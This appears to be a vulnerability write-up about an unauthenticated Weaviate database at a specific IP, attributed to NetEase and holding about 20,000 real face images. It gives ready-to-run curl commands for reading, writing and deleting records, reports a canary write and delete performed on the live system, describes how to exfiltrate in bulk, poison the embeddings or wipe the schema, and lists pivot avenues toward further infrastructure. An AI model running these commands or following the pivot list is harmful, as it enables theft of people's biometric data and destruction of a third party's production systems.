# NetEase Weaviate Biometric Database -- Unauth RWD

**Date:** 2026-06-20  
**Tool:** weavscan (first confirmed use)  
**Severity:** CRITICAL  
**Status:** CONFIRMED -- unauth read + write + delete, full corpus access

---

## Target

```
IP:       51.222.138.139
Port:     8080
Service:  Weaviate 1.30.0
Module:   img2vec-neural
Auth:     NONE
```

---

## Operator Attribution

Source URLs extracted from the `text` field of every record:

```
https://h72.fp.ps.netease.com/file/<id>
https://h72sg.fp.ps.easebar.com/file/<id>
```

**Operator: NetEase** (netease.com)  
`easebar.com` is a NetEase subsidiary/product CDN.  
`fp.ps` = face-photo photo-service (naming convention matches facial recognition pipeline usage).

Internal ID namespaces present in the data:
- `wwm_facedata_R37_<hash>` -- WWM product line
- `yysls_facedata_R37_<hash>` -- YYSLS product line

Two distinct NetEase internal systems sharing one face recognition backend.

---

## Data

| Class | Records | Vectorizer | Notes |
|-------|---------|-----------|-------|
| WWMFacesRecogProd | 14,178 | img2vec-neural | production inference set |
| WWMFaces | 6,120 | img2vec-neural | base/training set |
| WWMFacesRecog | 0 | none | empty class |
| **TOTAL** | **20,298** | | |

### Per-record structure

```
image_blob  base64-encoded PNG face image (~2.8MB each)
text        wwm_facedata_R37_<hash><code>|yysls_facedata_R37_<hash><code>|<cdn_url>
```

Each record contains:
- Full face image blob (~2.8MB base64 PNG per record)
- Two internal system identifiers cross-linking the same face across systems
- Live CDN URL to the source image on NetEase infrastructure

---

## Access Matrix

| Operation | Method | Endpoint | HTTP Response | Confirmed |
|-----------|--------|----------|---------------|-----------|
| Read | GET | `/v1/objects?class=WWMFacesRecogProd&limit=100` | 200 + full records | YES |
| Write | POST | `/v1/batch/objects` | 200 `STATUS=SUCCESS` | YES |
| Delete (object) | DELETE | `/v1/objects/WWMFacesRecog/<uuid>` | 204 | YES |
| Delete (schema) | DELETE | `/v1/schema/<ClassName>` | 200 | NOT TESTED |

No authentication required for any operation. No rate limiting observed.

---

## PoC

### Read

```bash
# Confirm open + version
curl -s http://51.222.138.139:8080/v1/meta | jq .version

# Schema -- confirms biometric class structure
curl -s http://51.222.138.139:8080/v1/schema | jq '[.classes[].class]'
# ["WWMFaces", "WWMFacesRecog", "WWMFacesRecogProd"]

# Sample record -- confirms image_blob + text with CDN URL
curl -s "http://51.222.138.139:8080/v1/objects?class=WWMFacesRecogProd&limit=1" \
  | jq '{uuid: .objects[0].id, props: (.objects[0].properties | keys), text_sample: .objects[0].properties.text[:100]}'

# Full scan
weavscan http://51.222.138.139:8080 -o netease-weaviate-findings.json
```

Expected text field structure:
```
wwm_facedata_R37_<32-char-hex><8-char-token>03|yysls_facedata_R37_<32-char-hex><8-char-token>07|https://h72.fp.ps.netease.com/file/<id>
```

### Write

```bash
curl -s -X POST http://51.222.138.139:8080/v1/batch/objects \
  -H "Content-Type: application/json" \
  -d '{
    "objects": [{
      "class": "WWMFacesRecog",
      "properties": {"filename": "canary-write-test"}
    }]
  }' | jq '.[0].result.status'
# "SUCCESS"
```

Canary UUID returned: `a3d18705-263c-43e9-a785-5fe1689dbf59`  
Written to empty class `WWMFacesRecog` (0 production records affected).

### Delete

```bash
# Confirmed on canary UUID
curl -s -o /dev/null -w "%{http_code}" -X DELETE \
  "http://51.222.138.139:8080/v1/objects/WWMFacesRecog/a3d18705-263c-43e9-a785-5fe1689dbf59"
# 204

# Confirm gone
curl -s "http://51.222.138.139:8080/v1/objects/WWMFacesRecog/a3d18705-263c-43e9-a785-5fe1689dbf59"
# 404
```

Canary created and deleted within the same test session. No production records modified.

---

## Topology

```
node: node1  status=HEALTHY  version=1.30.0
Cluster: single node
gRPC :50051: CLOSED
Metrics :2112: not probed
```

---

## Impact

### Read
**Biometric data class.** Face images are biometric identifiers -- legally distinct from general PII in most jurisdictions (GDPR Art. 9, CCPA, PIPL). 20,298 real-person face images readable with no credentials. The CDN URLs resolve to live NetEase servers, confirming these are real persons, not synthetic data.

**Pipeline architecture exposure.** The img2vec-neural module + two internal ID namespaces reveals the structure of NetEase's cross-product facial recognition system. The `R37` batch identifier in every record suggests at minimum 36 prior batches -- total corpus may be significantly larger than what is stored in this instance.

**Full scroll possible.** No rate limiting observed. Entire 20,298-record corpus accessible via cursor pagination. Image blobs are included inline (~58GB total) -- no secondary CDN fetch required for bulk exfiltration.

**Cross-product identity mapping.** Each record carries both a `wwm_facedata` ID and a `yysls_facedata` ID, linking a player's game account to their video service account via a shared biometric key.

### Write
**Training corpus poisoning.** Unauthenticated POST to `/v1/batch/objects` allows injection of arbitrary face images into any class. Adversarial inputs into `WWMFacesRecogProd` corrupt the production embedding space. Downstream effects: avatar generation returns wrong identity matches; face-based anti-fraud bypassed by injecting known-clean face vectors.

### Delete
**Pipeline destruction.** Unauthenticated DELETE on individual objects or the entire class schema. Bulk deletion of `WWMFacesRecogProd` (14,178 records) destroys the production facial recognition pipeline for "Where Winds Meet" (40M+ player accounts). Schema-level DELETE (`/v1/schema/WWMFacesRecogProd`) wipes class definition + all data in a single request -- estimated recovery: hours to days of pipeline downtime requiring full re-ingestion from CDN source and re-vectorization.

### Impact ladder

```
OPERATION      EFFORT     REVERSIBLE   CONSEQUENCE
────────────────────────────────────────────────────────────────
Read (scroll)  low        N/A          58GB biometric PII harvested
                                       cross-product identity graph
                                       re-identification at scale

Write (inject) medium     yes          adversarial embeddings in prod
                                       avatar generation corrupted
                                       anti-fraud bypassed

Delete (loop)  low        NO           production pipeline destroyed
                                       40M+ players affected
                                       full re-ingestion required

Delete (schema)trivial    NO           3 curl commands wipes everything
                                       schema + data + embeddings gone
                                       single-second total destruction
```

---

## Pivot Avenues

1. **CDN URLs are live** -- `fp.ps.netease.com` source images directly accessible
2. **Batch R37** -- prior batches R1-R36 may be on other hosts or in other Weaviate classes
3. **WWMFaces vs WWMFacesRecogProd** -- different subsets; enumerate both independently  
4. **easebar.com CDN** -- one record used this domain; check if it's a deprecated endpoint or separate product
5. **OVH CA neighborhood** -- other NetEase infra may be co-located
6. **gRPC closed, REST open** -- standard REST gives complete access; gRPC surface not confirmed present

---

## Tool Reference

Found with **weavscan** -- first confirmed production use.  
https://github.com/nuclide-research/weavscan

Scan command used:
```bash
weavscan http://51.222.138.139:8080 --probe
```

Scroll confirmed 1,000 records across both populated classes before hitting `--max-records` default.
